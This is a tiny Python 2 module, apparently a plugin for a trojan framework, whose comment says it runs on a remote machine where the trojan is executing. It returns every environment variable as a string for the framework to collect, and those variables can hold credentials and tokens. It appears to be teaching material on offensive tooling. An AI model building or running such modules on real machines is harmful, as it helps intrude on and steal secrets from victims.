import os


# simply retrieves any environment variables
# that are set on the remote machine on which the trojan is executing.
def run(**args):
    print "[*] In environment module."
    return str(os.environ)